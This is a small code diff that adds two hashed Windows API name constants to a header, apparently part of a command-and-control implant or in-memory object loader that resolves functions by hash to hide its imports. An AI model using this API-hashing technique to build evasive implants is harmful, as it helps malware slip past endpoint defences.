@@ -79,6 +79,7 @@
 #define FuncHash_DisconnectNamedPipe                 0x55668f42
 #define FuncHash_WriteFile                           0x663cecb0
 #define FuncHash_ConnectNamedPipe                    0xc003c602
+#define FuncHash_FreeLibrary                         0x30eece3c
 #define FuncHash_GetCurrentDirectoryW                0x2ced73f4
 #define FuncHash_GetFileAttributesW                  0xcc9c6ce3
 #define FuncHash_FindFirstFileW                      0xae2636e5
@@ -269,6 +270,7 @@
 #define COFFAPI_GETPROCADDRESS                  0xcf31bb1f
 #define COFFAPI_GETMODULEHANDLE                 0x5a153f58
 #define COFFAPI_FREELIBRARY                     0x30eece3c
+#define COFFAPI_LOCALFREE                       0xa66df372
 
 #define HASH_KERNEL32                           0xadd31df0
 #define HASH_NTDLL                              0x70e61753
